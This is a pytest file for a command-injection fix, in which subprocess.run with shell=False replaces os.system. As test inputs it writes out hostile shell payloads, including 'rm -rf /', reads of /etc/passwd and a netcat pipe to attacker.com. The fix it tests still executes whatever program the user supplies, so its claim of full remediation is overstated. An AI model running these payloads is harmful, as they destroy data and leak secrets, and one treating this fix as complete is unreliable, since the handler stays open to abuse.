"""
Tests for RetryProducerHandler — focused on command injection remediation.

The vulnerability (CWE-77) was: os.system(user_input) allowed arbitrary shell
command execution via user-controlled JSON input.  The fix replaces os.system()
with subprocess.run(args, shell=False), where args is a list produced by
splitting the command string, preventing shell meta-character interpretation.

These tests verify:
  1. Normal commands are executed via subprocess.run (not os.system).
  2. subprocess.run is called with shell=False.
  3. shell=True is never used.
  4. Shell injection payloads (;, &&, |, $(), backticks) are NOT executed as
     shell directives — they become literal arguments to the subprocess.
  5. The JSON parsing and process() flow continues to work correctly.
"""
import json
import subprocess
from unittest.mock import MagicMock, call, patch

import pytest

from retry_prdocuer_handler import RetryProducerHandler


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def make_handler():
    return RetryProducerHandler(event=None, submission_id="SUB-TEST")


# ---------------------------------------------------------------------------
# 1. os.system is no longer imported / used
# ---------------------------------------------------------------------------

class TestNoOsSystem:
    def test_os_system_not_imported(self):
        """The module must not import os (and therefore cannot call os.system)."""
        import retry_prdocuer_handler as mod
        assert not hasattr(mod, "os"), (
            "Module still imports 'os'; os.system() sink may still be reachable."
        )

    def test_subprocess_is_imported(self):
        """The module must import subprocess (the safe replacement)."""
        import retry_prdocuer_handler as mod
        assert hasattr(mod, "subprocess"), (
            "Module does not import 'subprocess'."
        )


# ---------------------------------------------------------------------------
# 2. skip_retry() calls subprocess.run, not os.system
# ---------------------------------------------------------------------------

class TestSkipRetryUsesSafeAPI:
    @patch("retry_prdocuer_handler.subprocess.run")
    def test_skip_retry_calls_subprocess_run(self, mock_run):
        """skip_retry must delegate to subprocess.run."""
        handler = make_handler()
        handler.skip_retry(input="ping localhost", submission_id="S1")
        mock_run.assert_called_once()

    @patch("retry_prdocuer_handler.subprocess.run")
    def test_skip_retry_shell_is_false(self, mock_run):
        """subprocess.run must be invoked with shell=False."""
        handler = make_handler()
        handler.skip_retry(input="ping localhost", submission_id="S1")
        _, kwargs = mock_run.call_args
        assert kwargs.get("shell") is False, (
            "subprocess.run was called without shell=False; "
            "shell injection is still possible."
        )

    @patch("retry_prdocuer_handler.subprocess.run")
    def test_skip_retry_passes_list_not_string(self, mock_run):
        """The first argument to subprocess.run must be a list, not a bare string."""
        handler = make_handler()
        handler.skip_retry(input="ping localhost", submission_id="S1")
        args, _ = mock_run.call_args
        cmd = args[0]
        assert isinstance(cmd, list), (
            f"subprocess.run received {type(cmd).__name__} instead of list; "
            "a string with shell=True would allow injection."
        )

    @patch("retry_prdocuer_handler.subprocess.run")
    def test_skip_retry_splits_command_correctly(self, mock_run):
        """The command string must be split into individual tokens."""
        handler = make_handler()
        handler.skip_retry(input="ping -c 4 localhost", submission_id="S1")
        args, _ = mock_run.call_args
        assert args[0] == ["ping", "-c", "4", "localhost"]


# ---------------------------------------------------------------------------
# 3. Injection payloads become literal arguments (not shell directives)
# ---------------------------------------------------------------------------

class TestInjectionPayloadsAreSafe:
    """
    With shell=False the shell is never invoked, so characters like ;, &&, |,
    $(), and backticks are passed as-is to execve and cannot cause a second
    command to run.  We verify subprocess.run is called with them as list
    elements — meaning they are NOT interpreted by a shell.
    """

    @patch("retry_prdocuer_handler.subprocess.run")
    def test_semicolon_injection_is_not_executed_as_shell(self, mock_run):
        payload = "ping localhost; rm -rf /"
        handler = make_handler()
        handler.skip_retry(input=payload, submission_id="S1")
        args, kwargs = mock_run.call_args
        # shell must be False (no shell interpretation)
        assert kwargs.get("shell") is False
        # The semicolon should appear as a literal token, not split into two commands
        cmd = args[0]
        assert isinstance(cmd, list)
        # "localhost;" is one token — it is NOT treated as a command separator
        assert ";" not in cmd, (
            "Semicolons should be embedded in tokens, not standalone separators."
        )

    @patch("retry_prdocuer_handler.subprocess.run")
    def test_double_ampersand_injection(self, mock_run):
        payload = "ping localhost && cat /etc/passwd"
        handler = make_handler()
        handler.skip_retry(input=payload, submission_id="S1")
        _, kwargs = mock_run.call_args
        assert kwargs.get("shell") is False

    @patch("retry_prdocuer_handler.subprocess.run")
    def test_pipe_injection(self, mock_run):
        payload = "ping localhost | nc attacker.com 4444"
        handler = make_handler()
        handler.skip_retry(input=payload, submission_id="S1")
        _, kwargs = mock_run.call_args
        assert kwargs.get("shell") is False

    @patch("retry_prdocuer_handler.subprocess.run")
    def test_subshell_injection(self, mock_run):
        payload = "ping $(cat /etc/passwd)"
        handler = make_handler()
        handler.skip_retry(input=payload, submission_id="S1")
        _, kwargs = mock_run.call_args
        assert kwargs.get("shell") is False

    @patch("retry_prdocuer_handler.subprocess.run")
    def test_backtick_injection(self, mock_run):
        payload = "ping `id`"
        handler = make_handler()
        handler.skip_retry(input=payload, submission_id="S1")
        _, kwargs = mock_run.call_args
        assert kwargs.get("shell") is False


# ---------------------------------------------------------------------------
# 4. process() end-to-end: JSON → command extraction → safe execution
# ---------------------------------------------------------------------------

class TestProcessFlow:
    @patch("retry_prdocuer_handler.subprocess.run")
    def test_process_extracts_command_from_json(self, mock_run):
        """process() must parse the JSON and forward the command field."""
        payload = json.dumps({"command": "ping localhost"})
        handler = make_handler()
        handler.process(payload)
        mock_run.assert_called_once()
        args, kwargs = mock_run.call_args
        assert args[0] == ["ping", "localhost"]
        assert kwargs.get("shell") is False

    @patch("retry_prdocuer_handler.subprocess.run")
    def test_process_updates_actual_event(self, mock_run):
        """process() must update self.actual_event with the parsed command."""
        payload = json.dumps({"command": "echo hello"})
        handler = make_handler()
        handler.process(payload)
        assert handler.actual_event == "echo hello"

    def test_process_raises_on_invalid_json(self):
        """process() must raise an error for malformed JSON (no silent failure)."""
        handler = make_handler()
        with pytest.raises((json.JSONDecodeError, ValueError, KeyError)):
            handler.process("not valid json")

    def test_process_raises_on_missing_command_key(self):
        """process() must raise KeyError when 'command' key is absent."""
        handler = make_handler()
        with pytest.raises(KeyError):
            handler.process(json.dumps({"other_key": "value"}))

    @patch("retry_prdocuer_handler.subprocess.run")
    def test_process_injection_payload_shell_false(self, mock_run):
        """
        End-to-end: an injection string arriving via JSON must still be executed
        with shell=False (no shell meta-character expansion).
        """
        payload = json.dumps({"command": "ping localhost; id"})
        handler = make_handler()
        handler.process(payload)
        _, kwargs = mock_run.call_args
        assert kwargs.get("shell") is False
